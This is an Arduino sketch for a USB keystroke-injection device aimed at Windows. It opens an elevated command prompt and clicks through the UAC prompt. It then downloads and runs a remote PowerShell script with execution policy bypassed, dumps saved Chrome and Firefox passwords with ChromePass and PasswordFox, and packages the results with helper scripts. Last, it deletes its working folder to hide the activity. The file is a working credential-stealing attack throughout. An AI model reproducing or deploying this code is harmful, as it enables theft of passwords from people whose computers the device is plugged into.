#include "Keyboard.h"

void typeKey(int key) {
  Keyboard.press(key);
  delay(100);
  Keyboard.release(key);
}

void setup() {
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 600ms
  delay(600);
  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(100);
  Keyboard.print("powershell Start-Process cmd -Verb runAs");
  typeKey(KEY_RETURN);
  delay(100);
  Keyboard.press(KEY_LEFT_ARROW);
  delay(100);
  typeKey(KEY_RETURN);
  delay(1000);
  Keyboard.print("cd / & mkdir chrome & cd chrome");
  typeKey(KEY_RETURN);
  delay(100);
  Keyboard.print("mkdir Password");
  typeKey(KEY_RETURN);
  delay(100);
  Keyboard.print("echo (wget 'https://raw.githubusercontent.com/abdulaziesmuslim/TA/master/ChromeUpdateDownload.ps1' -OutFile ChromeUpdateDownload.ps1) > b.ps1");
  typeKey(KEY_RETURN);
  delay(100);
  Keyboard.print("powershell -ExecutionPolicy ByPass -File b.ps1");
  typeKey(KEY_RETURN);
  delay(100);
  Keyboard.print("powershell -ExecutionPolicy ByPass -File ChromeUpdateDownload.ps1");
  typeKey(KEY_RETURN);
  delay(100);
  Keyboard.print("ChromePass.exe /stext ChromePass.txt");
  typeKey(KEY_RETURN);
  delay(100);
  Keyboard.print("PasswordFox.exe /stext PasswordFox.txt");
  typeKey(KEY_RETURN);
  delay(5000);
  Keyboard.print("for %I in (ChromePass.txt PasswordFox.txt) do copy %I c:\\chrome\\Password");
  typeKey(KEY_RETURN);
  delay(1000);
  Keyboard.print("powershell ./zipping.ps1");
  typeKey(KEY_RETURN);
  delay(100);
  Keyboard.print("powershell ./maintenance.ps1");
  typeKey(KEY_RETURN);
  delay(100);
  Keyboard.print("cd C:/");
  typeKey(KEY_RETURN);
  delay(100);
  Keyboard.print("rmdir /s /q chrome");
  typeKey(KEY_RETURN);
  delay(100);
  Keyboard.print("exit");
  typeKey(KEY_RETURN);

  // Ending streampdateDownload.pps1
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
